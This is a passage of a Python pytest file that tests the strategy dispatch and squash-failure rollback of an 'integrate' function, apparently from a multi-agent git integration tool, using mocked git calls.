                tasks=[task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
                strategy="merge",
            )
        mock_merge.assert_called_once()

    @pytest.mark.asyncio
    async def test_rebase_strategy_dispatch(self, tmp_path):
        """strategy='rebase' dispatches to rebase_strategy."""
        task = _done_task("1", "abc123")

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            return _git_result(0, "sha\n")

        with patch("cagent.worktree.create_worktree"), \
             patch("cagent.integrator.rebase_strategy", new_callable=AsyncMock, return_value=([task], [])) as mock_rebase, \
             patch("cagent.integrator._run_git", side_effect=fake_git):
            await integrate(
                tasks=[task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
                strategy="rebase",
            )
        mock_rebase.assert_called_once()

    @pytest.mark.asyncio
    async def test_squash_reset_fails_raises(self, tmp_path):
        """Squash reset --soft fails -> reset --hard + raise."""
        task = _done_task("1", "abc123")
        call_log = []

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            call_log.append(args)
            if args[0] == "reset" and "--soft" in args:
                raise RuntimeError("reset --soft failed")
            if args[0] == "rev-parse":
                return _git_result(0, "sha\n")
            return _git_result(0, "")

        with patch("cagent.worktree.create_worktree"), \
             patch("cagent.integrator.cherry_pick_strategy", new_callable=AsyncMock, return_value=([task], [])), \
             patch("cagent.integrator._run_git", side_effect=fake_git), \
             pytest.raises(RuntimeError, match="reset --soft failed"):
            await integrate(
                tasks=[task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
                squash=True,
            )
        hard_resets = [a for a in call_log if a[0] == "reset" and "--hard" in a]
        assert len(hard_resets) == 1

    @pytest.mark.asyncio
    async def test_squash_commit_fails_raises(self, tmp_path):
        """Squash commit failure should raise RuntimeError instead of silently continuing."""
        task = _done_task("1", "abc123")
        call_log = []

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            call_log.append(args)
            if args[0] == "commit":
                return _git_result(1, "", "nothing to commit")
            if args[0] == "rev-parse":
                return _git_result(0, "sha\n")
            return _git_result(0, "")

        with patch("cagent.worktree.create_worktree"), \
             patch("cagent.integrator.cherry_pick_strategy", new_callable=AsyncMock, return_value=([task], [])), \
             patch("cagent.integrator._run_git", side_effect=fake_git), \
             pytest.raises(RuntimeError, match="Squash commit failed"):
            await integrate(
                tasks=[task], run_dir=tmp_path / "run1",
                base_sha="basesha", repo_root=tmp_path,
                squash=True,
            )
        hard_resets = [a for a in call_log if a[0] == "reset" and "--hard" in a]
        assert len(hard_resets) == 1
